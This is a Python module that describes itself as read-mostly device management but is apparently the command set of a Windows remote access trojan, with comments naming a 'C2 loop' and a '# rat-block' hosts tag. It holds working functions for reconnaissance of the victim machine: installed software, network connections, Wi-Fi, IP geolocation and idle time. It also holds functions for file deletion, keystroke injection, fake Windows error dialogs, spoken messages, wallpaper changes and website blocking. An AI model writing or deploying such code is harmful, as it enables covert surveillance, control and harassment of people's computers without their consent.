"""Inventory and device-management commands (read-mostly, non-destructive)."""
import ctypes
import json
import os
import platform
import re
import shutil
import subprocess
import threading
import time
import urllib.request
import winreg


# ---------------- time / session ----------------
def get_datetime():
    try:
        now = time.time()
        return {
            "status": "success",
            "data": {
                "local": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(now)),
                "utc": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(now)),
                "tz": time.strftime("%Z"),
                "epoch": int(now),
                "uptime": _dur(now - _boot()),
            },
        }
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _boot():
    try:
        import psutil
        return psutil.boot_time()
    except Exception:
        return time.time()


def _dur(sec):
    sec = int(sec)
    d, r = divmod(sec, 86400)
    h, r = divmod(r, 3600)
    m, _ = divmod(r, 60)
    return f"{d}d {h}h {m}m"


def get_idletime():
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}

        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]

        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        if not ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
            return {"status": "error", "message": "GetLastInputInfo failed"}

        tick = ctypes.windll.kernel32.GetTickCount()
        elapsed = tick - lii.dwTime
        return {
            "status": "success",
            "data": {
                "idle_seconds": int(elapsed / 1000),
                "idle_human": _dur(elapsed / 1000),
                "session": _session_id(),
            },
        }
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _session_id():
    """Read the session id without changing lock state.

    Note: user32.LockWorkStation() *performs* a lock, it does not report
    one, so it must never be called from a read-only query.
    """
    try:
        sid = ctypes.c_ulong()
        ctypes.windll.kernel32.ProcessIdToSessionId(
            ctypes.windll.kernel32.GetCurrentProcessId(), ctypes.byref(sid)
        )
        return f"session {sid.value}"
    except Exception:
        return "unavailable"


def check_admin():
    try:
        admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        try:
            buf = ctypes.create_unicode_buffer(256)
            ctypes.windll.advapi32.GetUserNameW(buf, 256)
            user = buf.value
        except Exception:
            user = os.environ.get("USERNAME", "?")
        return {
            "status": "success",
            "data": {
                "user": user,
                "admin": admin,
                "privileges": "high" if admin else "medium",
                "sid": _current_sid(),
            },
        }
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _current_sid():
    try:
        import win32api
        return str(win32api.GetTokenInformation(0, 1)[0])
    except Exception:
        return "unavailable"


# ---------------- installed software ----------------
def _uninstall_key():
    return [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
    ]


def get_installed():
    rows = []
    seen = set()
    for hive, path in _uninstall_key():
        try:
            key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
        except OSError:
            continue
        i = 0
        while True:
            try:
                sub = winreg.EnumKey(key, i)
            except OSError:
                break
            i += 1
            full = f"{path}\\{sub}"
            try:
                sk = winreg.OpenKey(hive, full, 0, winreg.KEY_READ)
            except OSError:
                continue
            info = {}
            for field in ("DisplayName", "DisplayVersion", "Publisher", "InstallDate"):
                try:
                    info[field] = winreg.QueryValueEx(sk, field)[0]
                except OSError:
                    pass
            winreg.CloseKey(sk)
            name = info.get("DisplayName")
            if name and name.lower() not in seen:
                seen.add(name.lower())
                rows.append({
                    "name": name,
                    "version": info.get("DisplayVersion", ""),
                    "publisher": info.get("Publisher", ""),
                    "installed": info.get("InstallDate", ""),
                })
        winreg.CloseKey(key)
    rows.sort(key=lambda r: r["name"].lower())
    return {"status": "success", "data": rows}


# ---------------- devices ----------------
def get_devices():
    rows = []
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "Get-PnpDevice -PresentOnly | Select-Object Class,FriendlyName,Status | "
             "ConvertTo-Json -Compress"],
            capture_output=True, text=True, timeout=45,
        ).stdout
        data = json.loads(out) if out.strip() else []
        if isinstance(data, dict):
            data = [data]
        for d in data:
            name = (d.get("FriendlyName") or "").strip()
            cls = (d.get("Class") or "").strip()
            if not name and not cls:
                continue
            rows.append({
                "class": cls or "?",
                "name": name or "(unnamed)",
                "status": d.get("Status") or "",
            })
    except Exception as e:
        return {"status": "error", "message": f"device query failed: {type(e).__name__}: {e}"}

    rows.sort(key=lambda r: (r.get("class") or "", r.get("name") or ""))
    return {"status": "success", "data": rows}


# ---------------- network info ----------------
def get_ipconfig():
    try:
        rows = []
        stats = {}
        import psutil
        for name, st in psutil.net_if_stats().items():
            stats[name] = "up" if st.isup else "down"
        for iface, entries in psutil.net_if_addrs().items():
            for e in entries:
                if e.family == 2:      # AF_INET
                    rows.append({
                        "interface": iface,
                        "state": stats.get(iface, "?"),
                        "kind": "ipv4",
                        "addr": e.address,
                        "netmask": e.netmask or "",
                    })
                elif e.family == 23:    # AF_INET6
                    if e.address.lower().startswith("fe80"):
                        continue        # skip link-local noise
                    rows.append({
                        "interface": iface,
                        "state": stats.get(iface, "?"),
                        "kind": "ipv6",
                        "addr": e.address,
                        "netmask": "",
                    })
        route = _default_route()
        return {"status": "success", "data": rows, "default_route": route}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _default_route():
    try:
        import psutil
        for iface, entries in psutil.net_if_addrs().items():
            for e in entries:
                if e.family == 2 and not e.address.startswith("169.254."):
                    st = psutil.net_if_stats().get(iface)
                    mtu = getattr(st, "mtu", "?")
                    return f"{iface} via {e.address}/{e.netmask} mtu={mtu}"
        return "no non-link-local ipv4"
    except Exception:
        return "unavailable"


def get_netstat():
    try:
        import psutil
        rows = []
        for c in psutil.net_connections(kind="inet"):
            rows.append({
                "proto": "tcp",
                "local": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "",
                "remote": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "",
                "state": c.status,
                "pid": c.pid,
                "process": _pname(c.pid),
            })
        return {"status": "success", "data": rows}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _pname(pid):
    if not pid:
        return ""
    try:
        import psutil
        return psutil.Process(pid).name()
    except Exception:
        return ""


def get_env():
    keep = ("USER", "USERNAME", "COMPUTERNAME", "HOME", "HOMEPATH", "PATH",
            "TEMP", "TMP", "SYSTEMROOT", "WINDIR", "APPDATA", "PROGRAMFILES",
            "PROCESSOR_ARCHITECTURE", "OS", "NUMBER_OF_PROCESSORS", "COMSPEC")
    rows = [{"name": k, "value": os.environ.get(k, "")} for k in keep if k in os.environ]
    return {"status": "success", "data": rows}


def get_wifi_networks():
    """Nearby wireless networks (SSID / signal / auth). No stored keys."""
    try:
        if os.name != "nt":
            return {"status": "error", "message": "Windows only"}
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "networks", "mode=bssid"],
                stderr=subprocess.STDOUT,
            ).decode("utf-8", "ignore")
        except subprocess.CalledProcessError as e:
            err = (e.output or b"").decode("utf-8", "ignore").lower()
            if "no wireless interface" in err or "wireless lan service" in err:
                return {"status": "error", "message": "no wireless interface on this host"}
            return {"status": "error", "message": "netsh failed: " + err[:120]}
        except FileNotFoundError:
            return {"status": "error", "message": "netsh not found"}

        nets, cur = [], None
        for line in out.splitlines():
            s = line.strip()
            if s.startswith("SSID") and ":" in s:
                val = s.split(":", 1)[1].strip()
                cur = {"ssid": val, "signal": "", "auth": "", "channel": ""}
                nets.append(cur)
            elif cur is not None and s.startswith("Signal"):
                cur["signal"] = s.split(":", 1)[1].strip()
            elif cur is not None and s.startswith("Authentication"):
                cur["auth"] = s.split(":", 1)[1].strip()
            elif cur is not None and s.startswith("Channel"):
                cur["channel"] = s.split(":", 1)[1].strip()

        return {"status": "success", "data": nets}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def geolocate():
    try:
        req = urllib.request.Request(
            "https://ipapi.co/json/", headers={"User-Agent": "curl/8"}
        )
        with urllib.request.urlopen(req, timeout=12) as r:
            d = json.loads(r.read().decode())
        return {
            "status": "success",
            "data": {
                "ip": d.get("ip"),
                "city": d.get("city"),
                "region": d.get("region"),
                "country": d.get("country_name"),
                "org": d.get("org"),
                "timezone": d.get("timezone"),
                "lat/lon": f"{d.get('latitude')},{d.get('longitude')}",
            },
        }
    except Exception as e:
        return {"status": "error", "message": f"geolocate failed: {type(e).__name__}: {e}"}


# ---------------- working directory + file ops ----------------
class FileOps:
    def __init__(self):
        self.cwd = os.getcwd()

    def resolve(self, path):
        """Resolve a possibly-relative path against the session cwd."""
        p = str(path).strip().strip('"')
        if not p:
            return self.cwd
        full = p if os.path.isabs(p) else os.path.join(self.cwd, p)
        return os.path.normpath(full)

    def cd(self, path):
        target = self.resolve(path)
        if not os.path.isdir(target):
            return {"status": "error", "message": f"not a directory: {target}"}
        # normalize so ".." and symlinks don't accumulate in the session path
        self.cwd = os.path.realpath(target)
        return {"status": "success", "data": {"cwd": self.cwd}}

    def currentdir(self):
        return {"status": "success", "data": {"cwd": self.cwd}}

    def copy(self, src, dst):
        s, d = self.resolve(src), self.resolve(dst)
        try:
            if os.path.isdir(s):
                if os.path.exists(d):
                    d = os.path.join(d, os.path.basename(s.rstrip("\\/")))
                shutil.copytree(s, d)
            else:
                shutil.copy2(s, d)
            return {"status": "success", "data": {"result": f"copied -> {d}"}}
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    def move(self, src, dst):
        s, d = self.resolve(src), self.resolve(dst)
        try:
            shutil.move(s, d)
            return {"status": "success", "data": {"result": f"moved -> {d}"}}
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    def rename(self, old, new):
        return self.move(old, new)

    def mkdir(self, path):
        p = self.resolve(path)
        try:
            os.makedirs(p, exist_ok=True)
            return {"status": "success", "data": {"result": f"created {p}"}}
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    def delete(self, path):
        p = self.resolve(path)
        try:
            if os.path.isdir(p):
                shutil.rmtree(p)
                return {"status": "success", "data": {"result": f"removed dir {p}"}}
            if os.path.exists(p):
                os.remove(p)
                return {"status": "success", "data": {"result": f"removed file {p}"}}
            return {"status": "error", "message": f"not found: {p}"}
        except Exception as e:
            return {"status": "error", "message": f"{type(e).__name__}: {e}"}


# ---------------- desktop interaction ----------------
def _ps_quote(text):
    """Quote a string for safe embedding in a PowerShell single-quoted literal."""
    return "'" + str(text).replace("'", "''") + "'"


def _run_ps(script, timeout=25):
    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-STA", "-Command", script],
            capture_output=True, text=True, timeout=timeout,
        )
        err = (proc.stderr or "").strip()
        if proc.returncode != 0 or err:
            return {"status": "error", "message": (err or f"exit {proc.returncode}")[:200]}
        return {"status": "success", "output": (proc.stdout or "").strip()}
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "timed out"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def _message_box(text, title, icon):
    """Blocking MessageBoxW. Runs on a worker thread so the C2 loop stays live."""
    try:
        MB_OK = 0x0
        icons = {"info": 0x40, "warn": 0x30, "error": 0x10}
        flags = MB_OK | icons.get(icon, 0x40)
        ctypes.windll.user32.MessageBoxW(None, str(text), str(title), flags)
    except Exception as e:
        print(f"[!] MessageBox failed: {type(e).__name__}: {e}")


def show_message(text, title="Notice", icon=0x40):
    """MessageBox on the interactive session. Returns immediately."""
    threading.Thread(
        target=_message_box, args=(text, title, icon), daemon=True
    ).start()
    return {"status": "success", "output": f"message box shown: {text}"}


def fake_error(text, title="Windows Error"):
    """Error-styled MessageBox. Title overridable with `title | text`."""
    if not text.strip():
        return {"status": "error", "message": "usage: /fake <text> or /fake <title> | <text>"}
    if "|" in text:
        head, _, tail = text.partition("|")
        title, text = head.strip() or title, tail.strip()
    if not text.strip():
        return {"status": "error", "message": "empty message text"}
    r = show_message(text, title, icon="error")
    r["output"] = f"error dialog shown: {text}"
    return r


def speak(text):
    """Speak text aloud via the built-in SAPI voice."""
    if not text.strip():
        return {"status": "error", "message": "nothing to say"}
    script = (
        "Add-Type -AssemblyName System.Speech; "
        "$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; "
        f"$s.Speak({_ps_quote(text)}); $s.Dispose()"
    )
    r = _run_ps(script, timeout=60)
    if r["status"] == "success":
        r["output"] = f"spoke {len(text)} chars"
    return r


_SENDKEYS_SPECIAL = {"+": "{+}", "^": "{^}", "%": "{%}", "~": "{~}",
                     "(": "{(}", ")": "{)}", "{": "{{}", "}": "}}",
                     "[": "{[}", "]": "{]}"}


def type_text(text):
    """Synthesise keystrokes into the foreground window."""
    if not text:
        return {"status": "error", "message": "nothing to type"}
    escaped = "".join(_SENDKEYS_SPECIAL.get(c, c) for c in text)
    script = (
        "Add-Type -AssemblyName System.Windows.Forms; "
        f"[System.Windows.Forms.SendKeys]::SendWait({_ps_quote(escaped)})"
    )
    r = _run_ps(script)
    if r["status"] == "success":
        r["output"] = f"typed {len(text)} chars"
    return r


URL_SCHEMES = ("http", "https", "file", "mailto")
_SCHEME_RE = re.compile(r"^([a-z][a-z0-9+.-]*):", re.I)


def _normalize_url(raw):
    """Return (url, None) for a launchable target, or (None, reason)."""
    u = " ".join(str(raw).split())
    if not u:
        return None, "no url given"

    m = _SCHEME_RE.match(u)
    if m:
        scheme = m.group(1).lower()
        if scheme not in URL_SCHEMES:
            return None, f"scheme not allowed: {scheme}"
        rest = u[m.end():]
        if scheme == "mailto":
            addr = rest.split("?", 1)[0]
            if "@" not in addr or not addr.rsplit("@", 1)[-1].strip():
                return None, "mailto needs an address"
            return "mailto:" + rest, None
        rest = rest[2:] if rest.startswith("//") else rest
    else:
        scheme, rest = "https", u

    if scheme in ("http", "https"):
        host = rest.split("/", 1)[0].rsplit("@", 1)[-1]
        if not host.endswith("]"):
            host = host.rsplit(":", 1)[0]
        if not host or len(host) > 253 or not _DOMAIN_RE.match(host.lower()):
            return None, f"bad host: {host!r}"

    return f"{scheme}://{rest}", None


def open_url(url):
    """Launch a URL with the default browser. Scheme whitelist + host validation."""
    u, why = _normalize_url(url)
    if not u:
        return {"status": "error", "message": why}
    try:
        os.startfile(u)
        return {"status": "success", "output": f"opened {u}"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


_MEDIA_KEYS = {
    "volumeup": 0xAF,
    "volumedown": 0xAE,
    "mute": 0xAD,
}


def media_key(action):
    """Send a media key (volume up/down, mute)."""
    vk = _MEDIA_KEYS.get(action)
    if not vk:
        return {"status": "error", "message": f"unknown media action: {action}"}
    try:
        KEYEVENTF_KEYUP = 0x0002
        user32 = ctypes.windll.user32
        for _ in range(3):  # volume keys step 2% per press on most systems
            user32.keybd_event(vk, 0, 0, 0)
            user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        return {"status": "success", "output": f"sent {action} x3"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def set_wallpaper(image_path):
    """Apply an image as the desktop wallpaper."""
    try:
        SPI_SETWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        path = os.path.abspath(image_path)
        if not os.path.isfile(path):
            return {"status": "error", "message": f"image not found: {path}"}
        ok = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        if not ok:
            return {"status": "error", "message": "SystemParametersInfoW returned 0"}
        return {"status": "success", "output": f"wallpaper set: {os.path.basename(path)}"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


def play_audio(audio_path):
    """Play a sound file asynchronously."""
    try:
        SND_FILENAME = 0x00020000
        SND_ASYNC = 0x0001
        path = os.path.abspath(audio_path)
        if not os.path.isfile(path):
            return {"status": "error", "message": f"audio not found: {path}"}
        ok = ctypes.windll.winmm.PlaySoundW(path, None, SND_FILENAME | SND_ASYNC)
        if not ok:
            return {"status": "error", "message": "PlaySoundW failed (unsupported format?)"}
        return {"status": "success", "output": f"playing {os.path.basename(path)}"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}


# ---- hosts-file site blocking ----
HOSTS_PATH = os.path.join(
    os.environ.get("SystemRoot", r"C:\Windows"),
    "System32", "drivers", "etc", "hosts",
)
HOSTS_TAG = "# rat-block"
_LABEL = r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?"
_DOMAIN_RE = re.compile(rf"^{_LABEL}(?:\.{_LABEL})+$")


def _normalize_site(site):
    """Bare domain from a hostname or URL. None if it is not a plain domain."""
    if not site or len(site) > 512:
        return None
    s = site.strip().lower()
    s = re.sub(r"^[a-z][a-z0-9+.-]*://", "", s)
    s = s.split("/", 1)[0].split("?", 1)[0].split("#", 1)[0]
    s = s.rsplit("@", 1)[-1]
    s = s.rsplit(":", 1)[0] if not s.endswith("]") else s
    if s.startswith("www."):
        s = s[4:]
    return s if len(s) <= 253 and _DOMAIN_RE.match(s) else None


def _hosts_domain(line):
    body = line.split("#", 1)[0].split()
    return body[1].lower() if len(body) > 1 else None


def _read_hosts():
    with open(HOSTS_PATH, "r", encoding="utf-8", errors="replace") as f:
        return f.read().splitlines()


def _write_hosts(lines):
    with open(HOSTS_PATH, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(lines).rstrip("\n") + "\n")


def _flush_dns():
    try:
        subprocess.run(["ipconfig", "/flushdns"], capture_output=True, timeout=10)
    except Exception:
        pass


def block_site(site):
    """Point a domain at 0.0.0.0 in the hosts file, tagged for later removal."""
    domain = _normalize_site(site)
    if not domain:
        return {"status": "error", "message": f"not a domain: {site!r}"}
    if not check_admin()["data"].get("admin"):
        return {"status": "error", "message": "need admin to write the hosts file"}
    targets = [domain] if domain.startswith("www.") else [domain, f"www.{domain}"]
    try:
        lines = _read_hosts()
        kept = [l for l in lines
                if not (HOSTS_TAG in l and _hosts_domain(l) in targets)]
        kept.extend(f"0.0.0.0 {t} {HOSTS_TAG}" for t in targets)
        _write_hosts(kept)
    except PermissionError:
        return {"status": "error", "message": "permission denied on hosts file"}
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}
    _flush_dns()
    return {"status": "success", "output": f"blocked {', '.join(targets)}"}


def unblock_site(site):
    """Remove only the entries block_site added."""
    domain = _normalize_site(site)
    if not domain:
        return {"status": "error", "message": f"not a domain: {site!r}"}
    targets = {domain, f"www.{domain}"}
    try:
        kept, removed = [], 0
        for line in _read_hosts():
            if HOSTS_TAG in line and _hosts_domain(line) in targets:
                removed += 1
                continue
            kept.append(line)
        if removed:
            _write_hosts(kept)
    except Exception as e:
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}
    _flush_dns()
    return {"status": "success",
            "output": f"unblocked {domain} ({removed} entr{'y' if removed == 1 else 'ies'})"}

